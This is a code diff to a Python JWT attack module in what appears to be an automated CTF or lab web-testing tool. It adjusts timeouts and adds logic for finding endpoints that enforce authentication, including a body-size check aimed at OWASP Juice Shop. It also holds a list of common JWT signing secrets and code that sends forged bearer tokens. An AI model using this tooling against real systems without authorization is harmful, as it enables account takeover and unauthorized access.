@@ -14,7 +14,7 @@ from attacks.base import BaseAttack
 from engine.flag_hunter import extract_interesting_data, has_definite_flag
 from rich.console import Console
 
-console = Console()
+console = Console(legacy_windows=False)
 
 COMMON_SECRETS = [
     "", "secret", "password", "123456", "jwt", "key",
@@ -136,7 +136,7 @@ class JWTAttack(BaseAttack):
         url: str,
         token: str,
         cookie_name: str | None = None,
-    ) -> "httpx.Response | None":
+    ) -> object:
         """Send GET with forged JWT in Authorization header (and optionally cookie)."""
         headers = {"Authorization": f"Bearer {token}"}
         cookies: dict[str, str] = {}
@@ -144,7 +144,7 @@ class JWTAttack(BaseAttack):
             cookies[cookie_name] = token
         try:
             return await self.session.request(
-                "GET", url, headers=headers, cookies=cookies, timeout=10.0
+                "GET", url, headers=headers, cookies=cookies, timeout=5.0
             )
         except Exception:
             return None
@@ -162,15 +162,26 @@ class JWTAttack(BaseAttack):
         Returns None if no URL enforces auth.
         """
         for test_url in urls:
+            # Skip non-API paths (Angular hash routes, etc.)
+            if "/#/" in test_url or test_url.rstrip("/") == test_url.split("//", 1)[-1].split("/")[0]:
+                continue
             valid_resp = await self._request_with_token(test_url, valid_jwt, cookie_name)
             if not valid_resp or valid_resp.status_code != 200:
                 continue
             invalid_resp = await self._request_with_token(
                 test_url, "TWEB_INVALID_TOKEN_XYZ", cookie_name
             )
-            if not invalid_resp or invalid_resp.status_code not in (401, 403):
+            if not invalid_resp:
                 continue
-            return test_url, valid_resp.status_code
+            # Check 1: classic 401/403
+            if invalid_resp.status_code in (401, 403):
+                return test_url, valid_resp.status_code
+            # Check 2: both 200 but body size differs significantly (Juice Shop pattern)
+            if invalid_resp.status_code == 200:
+                v_len = len(valid_resp.content)
+                i_len = len(invalid_resp.content)
+                if v_len > 0 and abs(v_len - i_len) >= max(20, int(v_len * 0.20)):
+                    return test_url, valid_resp.status_code
         return None
 
     async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
